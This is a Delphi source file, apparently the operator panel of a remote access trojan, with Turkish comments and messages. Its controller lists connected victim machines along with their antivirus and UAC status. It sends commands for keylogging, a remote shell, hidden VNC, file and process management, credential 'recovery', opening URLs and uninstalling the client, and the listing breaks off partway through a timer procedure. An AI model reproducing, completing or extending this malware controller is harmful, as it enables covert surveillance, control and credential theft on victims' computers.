unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, Winapi.CommCtrl, Winapi.Winsock2,
  System.SysUtils, System.Variants, System.Classes,
  System.JSON,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.ComCtrls, Vcl.StdCtrls, Vcl.Samples.Spin, Vcl.ExtCtrls, Vcl.Menus,
  ncSockets, ncLines,
  ServerManager,
  UnitSendMessage,
  UnitGetInformation,
  UnitProcessManager,
  UnitRemoteShell,
  UnitRemoteMonitoring,
  UnitKeylogger,
  UnitOpenURL,
  Vcl.WinXCtrls, Vcl.Imaging.jpeg, System.ImageList, Vcl.ImgList;

type
  TForm1 = class(TForm)
    PageControl1     : TPageControl;
    Clients          : TTabSheet;
    Settings         : TTabSheet;
    ListView1: TListView;
    GroupBox1        : TGroupBox;
    SpinEdit1        : TSpinEdit;
    Button1          : TButton;
    StatusBar3       : TStatusBar;
    ncTCPServer1     : TncTCPServer;
    PopupMenu1       : TPopupMenu;
    SendMessage1     : TMenuItem;
    Information1     : TMenuItem;
    Logs             : TTabSheet;
    ListView2        : TListView;
    GroupBox2        : TGroupBox;
    ToggleSwitch1    : TToggleSwitch;
    ToggleSwitch2    : TToggleSwitch;
    ToggleSwitch3    : TToggleSwitch;
    PopupMenu2       : TPopupMenu;
    ClearLogs1       : TMenuItem;
    ProcessManager1  : TMenuItem;
    RemoteShell1     : TMenuItem;
    RemoteMonitoring1: TMenuItem;
    Keylogger1       : TMenuItem;
    OpenURL1         : TMenuItem;
    FileManager1     : TMenuItem;
    HiddenVNC1       : TMenuItem;
    Recovery1: TMenuItem;
    GroupBox3: TGroupBox;
    Button2: TButton;
    ComboBox1: TComboBox;
    ToggleSwitch4: TToggleSwitch;
    ToggleSwitch5: TToggleSwitch;
    TabSheet1: TTabSheet;
    ClientOptions1: TMenuItem;
    UninstallClient1: TMenuItem;
    CloseClient1: TMenuItem;
    ReconnectClient1: TMenuItem;
    GroupBox4: TGroupBox;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label9: TLabel;
    Panel1: TPanel;
    Panel2: TPanel;
    ListView3: TListView;
    ImageList1: TImageList;

    procedure Button1Click(Sender: TObject);
    procedure SendMessage1Click(Sender: TObject);
    procedure Information1Click(Sender: TObject);
    procedure ProcessManager1Click(Sender: TObject);
    procedure ListView1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormCreate(Sender: TObject);
    procedure ClearLogs1Click(Sender: TObject);
    procedure RemoteShell1Click(Sender: TObject);
    procedure RemoteMonitoring1Click(Sender: TObject);
    procedure Keylogger1Click(Sender: TObject);
    procedure OpenURL1Click(Sender: TObject);
    procedure FileManager1Click(Sender: TObject);
    procedure HiddenVNC1Click(Sender: TObject);
    procedure Recovery1Click(Sender: TObject);
    procedure TabSheet1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure FlowPanel1Click(Sender: TObject);
    procedure UninstallClient1Click(Sender: TObject);
    procedure ReconnectClient1Click(Sender: TObject);
    procedure CloseClient1Click(Sender: TObject);

  private
    FServerManager: TServerManager;
    FCurrentPort  : Integer;
    FStartTime    : TDateTime;
    FTimerUI      : TTimer;
    FLastIdleTime : Int64;
    FLastKernelTime: Int64;
    FLastUserTime : Int64;

    procedure OnClientConnected   (const Info: TClientInfo);
    procedure OnClientUpdated     (const Info: TClientInfo);
    procedure OnClientDisconnected(aLine: TncLine);
    procedure OnInfoReceived      (aLine: TncLine; JSONObj: TJSONObject);
    procedure OnProcessReceived   (aLine: TncLine; JSONObj: TJSONObject);
    procedure OnRemoteShellReceived(aLine: TncLine; JSONObj: TJSONObject);
    procedure OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
    procedure OnKeyloggerReceived (aLine: TncLine; JSONObj: TJSONObject);
    procedure OnFileManagerReceived(aLine: TncLine; JSONObj: TJSONObject);
    procedure OnHVNCReceived      (aLine: TncLine; JSONObj: TJSONObject);
    procedure OnServerLog         (Category: TLogCategory; const Msg: string);

    procedure AddLog(Category: TLogCategory; const Msg: string);
    procedure EnsureRemoteMonitoringMenuItem;
    procedure EnsureKeyloggerMenuItem;
    procedure EnsureOpenURLMenuItem;

    function  IsRealClientValue(const Value: string): Boolean;
    function  PreferClientValue(const NewValue, CurrentValue: string): string;
    procedure AddOrUpdateListView(const Info: TClientInfo);
    procedure RemoveFromListView(aLine: TncLine);
    procedure UpdateStatusBar;
    procedure OnTimerUI(Sender: TObject);
    function GetLocalIP: string;
    function GetCPUUsage: Double;
    function GetCountryIndex(const ACode: string): Integer;

  public
    procedure AfterConstruction; override;
    procedure BeforeDestruction; override;
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

uses
  UnitFileManager, UnitHiddenVNC;

{ ------------------------------------------------------------------ }
{  Lifecycle                                                           }
{ ------------------------------------------------------------------ }

procedure TForm1.AfterConstruction;
begin
  inherited;

  FServerManager := TServerManager.Create(ncTCPServer1);
  FServerManager.OnClientConnected     := OnClientConnected;
  FServerManager.OnClientUpdated       := OnClientUpdated;
  FServerManager.OnClientDisconnected  := OnClientDisconnected;
  FServerManager.OnInfoReceived        := OnInfoReceived;
  FServerManager.OnProcessReceived     := OnProcessReceived;
  FServerManager.OnRemoteShellReceived := OnRemoteShellReceived;
  FServerManager.OnMonitoringReceived  := OnMonitoringReceived;
  FServerManager.OnKeyloggerReceived   := OnKeyloggerReceived;
  FServerManager.OnFileManagerReceived := OnFileManagerReceived;
  FServerManager.OnHVNCReceived        := OnHVNCReceived;
  FServerManager.OnLog                 := OnServerLog;

  if Assigned(ProcessManager1) then ProcessManager1.OnClick := ProcessManager1Click;
  if Assigned(RemoteShell1)    then RemoteShell1.OnClick    := RemoteShell1Click;
  if Assigned(Keylogger1)      then Keylogger1.OnClick      := Keylogger1Click;
  if Assigned(FileManager1)    then FileManager1.OnClick    := FileManager1Click;
  if Assigned(HiddenVNC1)      then HiddenVNC1.OnClick      := HiddenVNC1Click;

  EnsureRemoteMonitoringMenuItem;
  EnsureKeyloggerMenuItem;
  EnsureOpenURLMenuItem;

  ListView1.OnMouseDown := ListView1MouseDown;

  FStartTime := Now;

  ListView3.SmallImages := ImageList1;
  ListView1.SmallImages := ImageList1;

  FTimerUI := TTimer.Create(Self);
  FTimerUI.Interval := 1000;
  FTimerUI.OnTimer := OnTimerUI;
  FTimerUI.Enabled := True;
end;

procedure TForm1.BeforeDestruction;
begin
  if Assigned(FServerManager) then
  begin
    FServerManager.Stop;
    FServerManager.Free;
    FServerManager := nil;
  end;
  inherited;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  // Asıl init AfterConstruction'da
end;

{ ------------------------------------------------------------------ }
{  Server Start/Stop                                                   }
{ ------------------------------------------------------------------ }

procedure TForm1.Button1Click(Sender: TObject);
var
  NewPort: Integer;
begin
  NewPort := SpinEdit1.Value;

  if not FServerManager.IsActive then
  begin
    FServerManager.Start(NewPort);
    FCurrentPort := NewPort;
    MessageBox(0, PChar('Sunucu başlatıldı. Port: ' + IntToStr(NewPort)),
               'Bilgi', MB_OK or MB_ICONINFORMATION);
    Exit;
  end;

  if NewPort = FCurrentPort then
  begin
    MessageBox(0, 'Bu port zaten dinleniyor.', 'Uyarı',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  FServerManager.Stop;
  FServerManager.Start(NewPort);
  FCurrentPort := NewPort;
  MessageBox(0, PChar('Port değiştirildi. Yeni port: ' + IntToStr(NewPort)),
             'Bilgi', MB_OK or MB_ICONINFORMATION);
end;

{ ------------------------------------------------------------------ }
{  Log System                                                          }
{ ------------------------------------------------------------------ }

procedure TForm1.OnServerLog(Category: TLogCategory; const Msg: string);
begin
  if not Assigned(FServerManager) then Exit;
  case Category of
    lcConnection: if ToggleSwitch1.State = tssOff then Exit;
    lcCommand   : if ToggleSwitch2.State = tssOff then Exit;
    lcError     : if ToggleSwitch3.State = tssOff then Exit;
  end;
  AddLog(Category, Msg);
end;

procedure TForm1.AddLog(Category: TLogCategory; const Msg: string);
var
  Item: TListItem;
begin
  ListView2.Items.BeginUpdate;
  try
    Item := ListView2.Items.Add;
    Item.Caption := FormatDateTime('hh:nn:ss', Now);
    Item.SubItems.Add(Msg);
    Item.MakeVisible(False);
  finally
    ListView2.Items.EndUpdate;
  end;
end;

procedure TForm1.ClearLogs1Click(Sender: TObject);
begin
  ListView2.Items.Clear;
end;

{ ------------------------------------------------------------------ }
{  MenuItem Ensure Helpers                                             }
{ ------------------------------------------------------------------ }

procedure TForm1.EnsureRemoteMonitoringMenuItem;
begin
  if not Assigned(PopupMenu1) then Exit;
  if not Assigned(RemoteMonitoring1) then
  begin
    RemoteMonitoring1         := TMenuItem.Create(PopupMenu1);
    RemoteMonitoring1.Caption := 'Remote Monitoring';
    PopupMenu1.Items.Add(RemoteMonitoring1);
  end;
  RemoteMonitoring1.OnClick := RemoteMonitoring1Click;
end;

procedure TForm1.EnsureKeyloggerMenuItem;
begin
  if not Assigned(PopupMenu1) then Exit;
  if not Assigned(Keylogger1) then
  begin
    Keylogger1         := TMenuItem.Create(PopupMenu1);
    Keylogger1.Caption := 'Keylogger';
    PopupMenu1.Items.Add(Keylogger1);
  end;
  Keylogger1.OnClick := Keylogger1Click;
end;

procedure TForm1.EnsureOpenURLMenuItem;
begin
  if not Assigned(PopupMenu1) then Exit;
  if not Assigned(OpenURL1) then
  begin
    OpenURL1         := TMenuItem.Create(PopupMenu1);
    OpenURL1.Caption := 'Open URL';
    PopupMenu1.Items.Add(OpenURL1);
  end;
  OpenURL1.OnClick := OpenURL1Click;
end;

{ ------------------------------------------------------------------ }
{  Popup: Send Message                                                 }
{ ------------------------------------------------------------------ }

procedure TForm1.SendMessage1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  JSONObj     : TJSONObject;
begin
  if ListView1.Selected = nil then Exit;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then Exit;

  Form2 := TForm2.Create(Self);
  try
    if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
      Form2.Label1.Caption := 'Hedef: ' + LInfo.ID;

    if Form2.ShowModal = mrOk then
    begin
      JSONObj := TJSONObject.Create;
      try
        JSONObj.AddPair('action', 'message');
        JSONObj.AddPair('title',  Form2.Edit1.Text);
        JSONObj.AddPair('text',   Form2.Memo1.Text);
        JSONObj.AddPair('type',   Form2.ComboBox1.Text);
        FServerManager.SendJSON(SelectedLine, JSONObj);
      finally
        JSONObj.Free;
      end;
    end;
  finally
    Form2.Free;
  end;
end;

procedure TForm1.TabSheet1ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
begin

end;

{ ------------------------------------------------------------------ }
{  Popup: Information                                                  }
{ ------------------------------------------------------------------ }

procedure TForm1.Information1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  JSONObj     : TJSONObject;
  F3          : TForm3;
begin
  if ListView1.Selected = nil then Exit;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then Exit;

  F3 := TForm3.Create(Application);

  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    F3.SetupForClient(SelectedLine, LInfo.ID)
  else
    F3.SetupForClient(SelectedLine, 'Unknown');

  FServerManager.RegisterInfoForm(SelectedLine, F3);
  F3.Show;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getinfo');
    FServerManager.SendJSON(SelectedLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

{ ------------------------------------------------------------------ }
{  Popup: Process Manager                                              }
{ ------------------------------------------------------------------ }

procedure TForm1.ProcessManager1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F4          : TForm4;
begin
  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'Process Manager',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'Process Manager',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F4 := FServerManager.GetProcessForm(SelectedLine);
  if Assigned(F4) then
  begin
    F4.Show;
    F4.BringToFront;
    F4.RequestProcesses;
    Exit;
  end;

  F4 := TForm4.Create(Application);

  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    F4.SetupForClient(SelectedLine, LInfo.ID,
                      FServerManager.SendJSON,
                      FServerManager.UnregisterProcessForm)
  else
    F4.SetupForClient(SelectedLine, 'Unknown',
                      FServerManager.SendJSON,
                      FServerManager.UnregisterProcessForm);

  FServerManager.RegisterProcessForm(SelectedLine, F4);
  F4.Show;
  F4.RequestProcesses;
end;

{ ------------------------------------------------------------------ }
{  Popup: Remote Shell                                                 }
{ ------------------------------------------------------------------ }

procedure TForm1.RemoteShell1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F5          : TForm5;
begin
  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'Remote Shell',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'Remote Shell',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F5 := FServerManager.GetRemoteShellForm(SelectedLine);
  if Assigned(F5) then
  begin
    F5.Show;
    F5.BringToFront;
    F5.RequestShellStart;
    Exit;
  end;

  F5 := TForm5.Create(Application);

  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    F5.SetupForClient(SelectedLine, LInfo.ID,
                      FServerManager.SendJSON,
                      FServerManager.UnregisterRemoteShellForm)
  else
    F5.SetupForClient(SelectedLine, 'Unknown',
                      FServerManager.SendJSON,
                      FServerManager.UnregisterRemoteShellForm);

  FServerManager.RegisterRemoteShellForm(SelectedLine, F5);
  F5.Show;
  F5.RequestShellStart;
end;

{ ------------------------------------------------------------------ }
{  Popup: Remote Monitoring                                            }
{ ------------------------------------------------------------------ }

procedure TForm1.Recovery1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  JSONObj: TJSONObject;
begin
  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'Recovery',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'Recovery',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'recovery');
    FServerManager.SendJSON(SelectedLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm1.RemoteMonitoring1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F6          : TForm6;
begin
  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'Remote Monitoring',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'Remote Monitoring',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F6 := FServerManager.GetMonitoringForm(SelectedLine);
  if Assigned(F6) then
  begin
    F6.Show;
    F6.BringToFront;
    F6.RequestMonitorList;
    Exit;
  end;

  F6 := TForm6.Create(Application);

  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    F6.SetupForClient(SelectedLine, LInfo.ID,
                      FServerManager.SendJSON,
                      FServerManager.UnregisterMonitoringForm)
  else
    F6.SetupForClient(SelectedLine, 'Unknown',
                      FServerManager.SendJSON,
                      FServerManager.UnregisterMonitoringForm);

  FServerManager.RegisterMonitoringForm(SelectedLine, F6);
  F6.Show;
  F6.RequestMonitorList;
end;

{ ------------------------------------------------------------------ }
{  Popup: Keylogger                                                    }
{ ------------------------------------------------------------------ }

procedure TForm1.Keylogger1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F7          : TForm7;
  ClientID    : string;
begin
  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;

  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'Keylogger',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'Keylogger',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F7 := FServerManager.GetKeyloggerForm(SelectedLine);

  ClientID := 'Unknown';
  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    ClientID := LInfo.ID;

  if not Assigned(F7) then
  begin
    F7 := TForm7.Create(Application);
    FServerManager.RegisterKeyloggerForm(SelectedLine, F7);
  end;

  F7.SetupForClient(SelectedLine, ClientID,
                    FServerManager.SendJSON,
                    FServerManager.UnregisterKeyloggerForm);
  F7.Show;
  F7.BringToFront;
end;

{ ------------------------------------------------------------------ }
{  Popup: Open URL                                                     }
{ ------------------------------------------------------------------ }

procedure TForm1.OpenURL1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F8          : TForm8;
  ClientID    : string;
begin
  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;

  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'Open URL',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'Open URL',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F8 := FServerManager.GetOpenURLForm(SelectedLine);

  ClientID := 'Unknown';
  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    ClientID := LInfo.ID;

  if not Assigned(F8) then
  begin
    F8 := TForm8.Create(Application);
    FServerManager.RegisterOpenURLForm(SelectedLine, F8);
  end;

  F8.SetupForClient(SelectedLine, ClientID,
                    FServerManager.SendJSON,
                    FServerManager.UnregisterOpenURLForm);
  F8.Show;
  F8.BringToFront;
end;

{ ------------------------------------------------------------------ }
{  Popup: File Manager                                                 }
{ ------------------------------------------------------------------ }

procedure TForm1.FileManager1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F9          : TForm9;
  ClientID    : string;
begin
  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;

  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'File Manager',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'File Manager',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F9 := FServerManager.GetFileManagerForm(SelectedLine);

  // Form zaten açıksa sadece öne getir, SetupForClient çağırma
  if Assigned(F9) then
  begin
    F9.Show;
    F9.BringToFront;
    Exit;
  end;

  ClientID := 'Unknown';
  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    ClientID := LInfo.ID;

  F9 := TForm9.Create(Application);
  FServerManager.RegisterFileManagerForm(SelectedLine, F9);

  F9.SetupForClient(SelectedLine, ClientID,
                    FServerManager.SendJSON,
                    FServerManager.SendBinaryPacket,
                    FServerManager.UnregisterFileManagerForm);
  F9.Show;
  F9.BringToFront;
  F9.RequestDrives;
end;

procedure TForm1.FlowPanel1Click(Sender: TObject);
begin

end;

{ ------------------------------------------------------------------ }
{  Popup: Hidden VNC  (DÜZELTİLDİ)                                   }
{ ------------------------------------------------------------------ }

procedure TForm1.HiddenVNC1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F10         : TForm10;
  ClientID    : string;
begin
  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;

  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'Hidden VNC',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'Hidden VNC',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F10 := FServerManager.GetHiddenVNCForm(SelectedLine);

  // *** DÜZELTME: Form zaten açıksa sadece öne getir, SetupForClient ÇAĞIRMA ***
  if Assigned(F10) then
  begin
    F10.Show;
    F10.BringToFront;
    Exit;
  end;

  // Yeni form oluştur
  ClientID := 'Unknown';
  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    ClientID := LInfo.ID;

  F10 := TForm10.Create(Application);
  FServerManager.RegisterHiddenVNCForm(SelectedLine, F10);

  F10.SetupForClient(SelectedLine, ClientID,
                     FServerManager.SendJSON,
                     FServerManager.UnregisterHiddenVNCForm);
  F10.Show;
  F10.BringToFront;
end;

{ ------------------------------------------------------------------ }
{  ListView Mouse                                                      }
{ ------------------------------------------------------------------ }

procedure TForm1.ListView1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Item: TListItem;
begin
  if Button <> mbRight then Exit;
  Item := ListView1.GetItemAt(X, Y);
  if Assigned(Item) then
    Item.Selected := True;
end;

{ ------------------------------------------------------------------ }
{  ServerManager Callbacks                                             }
{ ------------------------------------------------------------------ }

procedure TForm1.OnClientConnected(const Info: TClientInfo);
var
  LatestInfo: TClientInfo;
begin
  if not Assigned(FServerManager) then Exit;
  if FServerManager.TryGetClientInfo(Info.LineHandle, LatestInfo) then
    AddOrUpdateListView(LatestInfo)
  else
    AddOrUpdateListView(Info);

  TThread.Queue(nil, TThreadProcedure(
    procedure
    var
      Item: TListItem;
      LCountry, LIP: string;
      LHandle: Pointer;
    begin
      LCountry := Info.Country;
      LIP := Info.IPAddress;
      LHandle := Info.LineHandle;

      if Assigned(FServerManager) then
      begin
        UpdateStatusBar;
        ListView3.Items.BeginUpdate;
        try
          Item := ListView3.Items.Insert(0);
          Item.Data := LHandle;
          Item.Caption := '';
          Item.ImageIndex := GetCountryIndex(LCountry);
          Item.SubItems.Add(LIP);
          Item.SubItems.Add(FormatDateTime('yyyy-mm-dd hh:nn:ss', Now));
        finally
          ListView3.Items.EndUpdate;
        end;
      end;
    end));
end;

procedure TForm1.OnClientUpdated(const Info: TClientInfo);
var
  LatestInfo: TClientInfo;
begin
  if not Assigned(FServerManager) then Exit;
  if FServerManager.TryGetClientInfo(Info.LineHandle, LatestInfo) then
    AddOrUpdateListView(LatestInfo)
  else
    AddOrUpdateListView(Info);
end;

procedure TForm1.OnClientDisconnected(aLine: TncLine);
begin
  if not Assigned(FServerManager) then Exit;
  RemoveFromListView(aLine);
  // No specific ListView3 remove requested, but keeping main list sync

  TThread.Queue(nil, TThreadProcedure(
    procedure
    begin
      if Assigned(FServerManager) then UpdateStatusBar;
    end));

  // Tüm açık form kayıtlarını temizle
  FServerManager.UnregisterInfoForm(aLine);
  FServerManager.UnregisterProcessForm(aLine);
  FServerManager.UnregisterRemoteShellForm(aLine);
  FServerManager.UnregisterMonitoringForm(aLine);
  FServerManager.UnregisterKeyloggerForm(aLine);
  FServerManager.UnregisterOpenURLForm(aLine);
  FServerManager.UnregisterFileManagerForm(aLine);
  FServerManager.UnregisterHiddenVNCForm(aLine);
end;

procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F3: TForm3;
begin
  if not Assigned(FServerManager) then Exit;
  F3 := FServerManager.GetInfoForm(aLine);
  if Assigned(F3) then F3.HandleInfoJSON(JSONObj);
end;

procedure TForm1.OnProcessReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F4: TForm4;
begin
  if not Assigned(FServerManager) then Exit;
  F4 := FServerManager.GetProcessForm(aLine);
  if Assigned(F4) then F4.HandleProcessJSON(JSONObj);
end;

procedure TForm1.OnRemoteShellReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F5: TForm5;
begin
  if not Assigned(FServerManager) then Exit;
  F5 := FServerManager.GetRemoteShellForm(aLine);
  if Assigned(F5) then F5.HandleShellJSON(JSONObj);
end;

procedure TForm1.OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F6: TForm6;
begin
  if not Assigned(FServerManager) then Exit;
  F6 := FServerManager.GetMonitoringForm(aLine);
  if Assigned(F6) then F6.HandleMonitoringJSON(JSONObj);
end;

procedure TForm1.OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F7: TForm7;
begin
  if not Assigned(FServerManager) then Exit;
  F7 := FServerManager.GetKeyloggerForm(aLine);
  if Assigned(F7) then F7.HandleKeyloggerJSON(JSONObj);
end;

procedure TForm1.OnFileManagerReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F9: TForm9;
begin
  if not Assigned(FServerManager) then Exit;
  F9 := FServerManager.GetFileManagerForm(aLine);
  if Assigned(F9) then F9.HandleFileManagerJSON(JSONObj);
end;

procedure TForm1.OnHVNCReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F10: TForm10;
begin
  if not Assigned(FServerManager) then Exit;
  F10 := FServerManager.GetHiddenVNCForm(aLine);
  if Assigned(F10) then F10.HandleHVNCJSON(JSONObj);
end;

{ ------------------------------------------------------------------ }
{  UI Helpers                                                          }
{ ------------------------------------------------------------------ }

function TForm1.IsRealClientValue(const Value: string): Boolean;
begin
  Result := (Trim(Value) <> '') and
            (Trim(Value) <> '...') and
            (not SameText(Trim(Value), 'N/A'));
end;

function TForm1.PreferClientValue(const NewValue, CurrentValue: string): string;
begin
  if IsRealClientValue(NewValue) then
    Result := NewValue
  else if IsRealClientValue(CurrentValue) then
    Result := CurrentValue
  else
    Result := NewValue;
end;

procedure TForm1.AddOrUpdateListView(const Info: TClientInfo);
begin
  TThread.Queue(nil, TThreadProcedure(
    procedure
    var
      Item: TListItem;
      i   : Integer;
    begin
      if not Assigned(FServerManager) then Exit;

      Item := nil;
      for i := 0 to ListView1.Items.Count - 1 do
        if TncLine(ListView1.Items[i].Data) = Info.LineHandle then
        begin
          Item := ListView1.Items[i];
          Break;
        end;

      if Item = nil then
      begin
        Item      := ListView1.Items.Add;
        Item.Data := Info.LineHandle;
        for i := 1 to 7 do
          Item.SubItems.Add('');
      end;

      Item.Caption     := PreferClientValue(Info.IPAddress,   Item.Caption);
      Item.SubItems[0] := PreferClientValue(Info.Country,     Item.SubItems[0]);
      Item.ImageIndex := GetCountryIndex(Info.Country);
      Item.SubItems[1] := PreferClientValue(Info.ID,          Item.SubItems[1]);
      Item.SubItems[2] := PreferClientValue(Info.DesktopName, Item.SubItems[2]);
      Item.SubItems[3] := PreferClientValue(Info.OS,          Item.SubItems[3]);
      Item.SubItems[4] := PreferClientValue(Info.Date,        Item.SubItems[4]);
      Item.SubItems[5] := PreferClientValue(Info.UAC,         Item.SubItems[5]);
      Item.SubItems[6] := PreferClientValue(Info.AntiVirus,   Item.SubItems[6]);

      // Update flags and IP in ListView3 (history)
      for i := 0 to ListView3.Items.Count - 1 do
      begin
        if ListView3.Items[i].Data = Info.LineHandle then
        begin
          ListView3.Items[i].ImageIndex := GetCountryIndex(Info.Country);
          ListView3.Items[i].SubItems[0] := Info.IPAddress;
        end;
      end;
    end));
end;

procedure TForm1.RemoveFromListView(aLine: TncLine);
begin
  TThread.Queue(nil, TThreadProcedure(
    procedure
    var
      i: Integer;
    begin
      if not Assigned(FServerManager) then Exit;
      for i := ListView1.Items.Count - 1 downto 0 do
        if TncLine(ListView1.Items[i].Data) = aLine then
        begin
          ListView1.Items.Delete(i);
          Break;
        end;
    end));
end;

procedure TForm1.UninstallClient1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  JSONObj: TJSONObject;
begin
  if ListView1.Selected = nil then Exit;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then Exit;

  if MessageBox(Handle, 'Seçili client silinsin mi?', 'Uninstall', MB_YESNO or MB_ICONQUESTION) = IDYES then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'uninstall');
      FServerManager.SendJSON(SelectedLine, JSONObj);
    finally
      JSONObj.Free;
    end;
  end;
end;

procedure TForm1.CloseClient1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  JSONObj: TJSONObject;
begin
  if ListView1.Selected = nil then Exit;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'close');
    FServerManager.SendJSON(SelectedLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm1.ReconnectClient1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  JSONObj: TJSONObject;
begin
  if ListView1.Selected = nil then Exit;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'reconnect');
    FServerManager.SendJSON(SelectedLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm1.UpdateStatusBar;
begin
  StatusBar3.Panels[0].Text :=
    'Clients Online [' + IntToStr(FServerManager.ClientCount) + ']';
end;


procedure TForm1.OnTimerUI(Sender: TObject);
var
